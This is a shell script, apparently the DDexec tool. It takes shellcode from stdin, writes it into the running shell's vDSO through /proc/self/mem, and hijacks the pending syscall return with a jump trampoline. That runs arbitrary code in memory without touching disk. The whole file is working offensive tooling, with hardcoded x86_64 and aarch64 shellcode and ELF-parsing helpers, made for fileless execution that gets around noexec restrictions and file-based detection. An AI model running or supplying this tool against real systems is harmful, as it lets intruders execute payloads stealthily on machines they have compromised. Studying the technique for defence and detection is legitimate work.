#!/bin/sh

# Prepend the shellcode with an infinite loop (so you can attach to it with gdb)
# Then in gdb just use `set $pc+=2' and you will be able to `si'.
# In ARM64 use `set $pc+=4'.
if [ -z "$DEBUG" ]; then DEBUG=0; fi

# If the seeker binary is not executable by your user, you may try to run it
# through the loader (typically ld.so).
if [ -z "$USE_INTERP" ]; then USE_INTERP=0; fi

# Currently tail is the default binary used to lseek() through the mem file.
if [ -z "$SEEKER" ]; then seeker=tail; else seeker="$SEEKER"; fi
seeker=$(command -v "$seeker") # Harry Potter vibes? Nah.
realname=$(basename $(readlink -f $seeker))
if [ -z ${realname##*box*} ] # Busybox / Toybox
then
    seeker=$(command -v "dd")
fi

# Endian conversion
endian()
{
    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
}

# search_section $filename $section
search_section()
{
    local data=""
    local header=$(od -v -t x1 -N 64 $1 | head -n -1 |\
                   cut -d' ' -f 2- | tr -d ' \n')
    # I'm not commenting this, RTFM.
    local shoff=${header:80:16}
    shoff=$(endian $shoff)
    shoff=$((0x$shoff))
    local shentsize=${header:116:4}
    shentsize=$(endian $shentsize)
    shentsize=$((0x$shentsize))
    local shentnum=${header:120:4}
    shentnum=$(endian $shentnum)
    shentnum=$((0x$shentnum))
    local shsize=$((shentnum * shentsize))
    local shstrndx=${header:124:4}
    shstrndx=$(endian $shstrndx)
    shstrndx=$((0x$shstrndx))
    sections=$(od -v -t x1 -N $shsize -j $shoff $1 | head -n-1 |\
               cut -d' ' -f2- | tr -d ' \n')

    local shstrtab_off=$((((shstrndx * shentsize) + 24) * 2))
    shstrtab_off=${sections:$shstrtab_off:16}
    shstrtab_off=$(endian $shstrtab_off)
    shstrtab_off=$((0x$shstrtab_off))
    local shstrtab_size=$((((shstrndx * shentsize) + 32) * 2))
    shstrtab_size=${sections:$shstrtab_size:16}
    shstrtab_size=$(endian $shstrtab_size)
    shstrtab_size=$((0x$shstrtab_size))
    local strtab=$(od -v -t x1 -N $shstrtab_size -j $shstrtab_off $1 |\
                   head -n-1 | cut -d' ' -f2- | tr -d ' \n')

    for i in $(seq 0 $((shentnum - 1)))
    do
        local section=${sections:$((i * shentsize * 2)):$((shentsize * 2))}
        local section_name_idx=$((0x$(endian ${section:0:8})))
        local name=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
        tr -d ' \n')00
        local section_name=${strtab:$section_name_idx * 2:${#name}}
        if [ $section_name = $name ]
        then
            local section_off=${section:24 * 2:16}
            section_off=$(endian $section_off)
            section_off=$((0x$section_off))

            local section_addr=${section:16 * 2:16}
            section_addr=$(endian $section_addr)
            section_addr=$((0x$section_addr))

            local section_size=${section:32 * 2:16}
            section_size=$(endian $section_size)
            section_size=$((0x$section_size))

            local section_size_ent=${section:56 * 2:16}
            section_size_ent=$(endian $section_size_ent)
            section_size_ent=$((0x$section_size_ent))

            echo -n $section_off $section_size $section_addr $section_size_ent
            break
        fi
    done
}

# Read shellcode from stdin
if [ "$1" = "-x" ]
then
    read -r sc
else
    sc=$(od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
fi

arch=$(uname -m)

# dup2(2, 0);
if [ "$arch" = "x86_64" ]
then
    sc="4831c04889c6b0024889c7b0210f05"$sc
elif [ "$arch" = "aarch64" ]
then
    sc="080380d2400080d2010080d2010000d4"$sc
else
    echo "DDexec: Error, this architecture is not supported." >&2
    exit
fi
sc_len=$(printf %016x $((${#sc} / 2)))

shell=$(readlink -f /proc/$$/exe)
# Make zsh behave somewhat like bash
if [ -n "$($shell --version 2> /dev/null | grep zsh)" ]
then
    setopt SH_WORD_SPLIT
    setopt KSH_ARRAYS
fi

# Interpreter (loader) for our seeker
if [ $USE_INTERP -eq 1 ]
then
    interp_off=$(search_section $seeker .interp)
    if [ -n "interp_off" ]
    then
        interp_size=$(echo $interp_off | cut -d' ' -f2)
        interp_off=$(echo $interp_off | cut -d' ' -f1)
        interp_=$(tail -c +$(($interp_off + 1)) $seeker |\
                  head -c $((interp_size - 1)))
    fi
fi

# The shellcode will be written into the vDSO
vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)))
# Trampoline to jump to the shellcode
if [ "$arch" = "x86_64" ]
then
    jmp="48b8"$(endian $(printf %016x $vdso_addr))"ffe0"
elif [ "$arch" = "aarch64" ]
then
    jmp="4000005800001fd6"$(endian $(printf %016x $vdso_addr))
fi

sc=$(printf $sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
jmp=$(printf $jmp | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')

read syscall_info < /proc/self/syscall
addr=$(($(echo $syscall_info | cut -d' ' -f9)))
exec 3>/proc/self/mem

# Arguments' format for the chosen seeker
if [ -z "$SEEKER_ARGS" ]
then
    if [ $(basename $seeker) = "tail" ]
    then
        SEEKER_ARGS='-c +$(($offset + 1))'
    elif   [ $(basename $seeker) = "dd" ]
    then
        SEEKER_ARGS='bs=1 skip=$offset'
    elif [ $(basename $seeker) = "hexdump" ]
    then
        SEEKER_ARGS='-s $offset'
    elif [ $(basename $seeker) = "cmp" ]
    then
        SEEKER_ARGS='-i $offset /dev/null'
    else
        echo "DDexec: Unknown seeker. Provide its arguments in SEEKER_ARGS."
        exit 1
    fi
fi

# Overwrite vDSO with our shellcode
seeker_args=${SEEKER_ARGS/'$offset'/$vdso_addr}
seeker_args="$(eval echo -n \"$seeker_args\")"
$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
printf $sc >&3

exec 3>&-
exec 3>/proc/self/mem

# Write jump instruction where it will be found shortly
seeker_args=${SEEKER_ARGS/'$offset'/$addr}
seeker_args="$(eval echo -n \"$seeker_args\")"
$interp_ $seeker $seeker_args <&3 >/dev/null 2>&1
printf $jmp >&3
